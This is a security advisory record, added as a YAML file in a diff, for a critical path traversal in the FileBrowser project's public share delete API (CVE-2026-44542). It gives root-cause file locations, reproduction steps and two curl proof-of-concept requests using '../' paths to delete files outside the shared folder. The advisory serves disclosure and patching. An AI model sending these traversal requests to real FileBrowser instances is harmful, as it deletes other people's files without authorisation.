@@ -1,0 +1,101 @@
+advisory_id: GHSA-fwj3-42wh-8673
+datasource_id: github_osv/GHSA-fwj3-42wh-8673
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-fwj3-42wh-8673/GHSA-fwj3-42wh-8673.json
+aliases:
+  - CVE-2026-44542
+summary: |
+  FileBrowser Public Share DELETE API Path Traversal Allows Unauthenticated Arbitrary File Deletion
+  ### **Summary**
+
+  Attacker-controlled path input is joined with a trusted base path prior to sanitization, allowing traversal sequences (e.g., ../) to escape the intended shared directory. As a result, an unauthenticated attacker possessing a valid public share hash with delete permissions enabled can delete arbitrary files outside the shared directory within the share owner’s configured storage scope.
+
+  ### **Affected Components**
+
+  **Two distinct vulnerable code paths:**
+
+  1. Stable versions (e.g., gtstef/filebrowser:stable)
+  `DELETE /public/api/resources?hash=<hash>&path=../victim`
+  Root cause: middleware.go:111
+  Issue: path query parameter is joined before SanitizeUserPath()
+  2. Development / HEAD (e.g., commit eabdfd9)
+  `DELETE /public/api/resources/bulk?hash=<hash>`
+  Body: [{"path":"../victim"}]
+  Root cause: resource.go:274
+  Issue: item.Path is joined before SanitizeUserPath()
+
+  ### **Steps to reproduce (Stable Version)**
+
+  **1. Create a directory structure:**
+
+  ```
+  /folder/shared_subdir/   (shared)
+  /folder/protected.txt    (outside shared directory)
+  ```
+
+  **2. Create a public share:**
+  ```
+  Path: /shared_subdir
+  AllowDelete=true
+  ```
+
+  **3. Send request:**
+
+  ```
+  curl -X DELETE "http://localhost/public/api/resources?hash=<HASH>&path=../protected.txt"
+
+  #Observe:
+  #protected.txt is deleted despite being outside the shared directory
+  ```
+
+  ### **Proof of Concept (HEAD / bulk endpoint)**
+
+  ```
+  curl -X DELETE "http://localhost/public/api/resources/bulk?hash=<HASH>" \
+    -H "Content-Type: application/json" \
+    -d '[{"path":"../protected.txt"}]'
+  ```
+
+  ### **Alternative PoC Scripts:**
+  [poc_v3.sh](https://github.com/user-attachments/files/26159404/poc_v3.sh) (**If the script fails due to environment differences, the manual PoC above reliably reproduces the issue.**)
+
+
+  ### **Impact**
+  An unauthenticated attacker with access to a public share link configured with delete permissions enabled can delete attacker-chosen files outside the shared directory, anywhere within the share owner’s storage scope. This results in unauthorized data loss and potential service disruption.
+impacted_packages:
+  - purl: pkg:github/gtsteffaniak/filebrowser
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/gtsteffaniak/filebrowser
+        commit: 112740bdd41de7d5eb01e13ba49d406bfc463f69
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-fwj3-42wh-8673/GHSA-fwj3-42wh-8673.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+references:
+  - url: https://github.com/gtsteffaniak/filebrowser
+    reference_type:
+    reference_id:
+  - url: https://github.com/gtsteffaniak/filebrowser/commit/112740bdd41de7d5eb01e13ba49d406bfc463f69
+    reference_type:
+    reference_id:
+  - url: https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-fwj3-42wh-8673
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-44542
+    reference_type:
+    reference_id:
+exploits: []
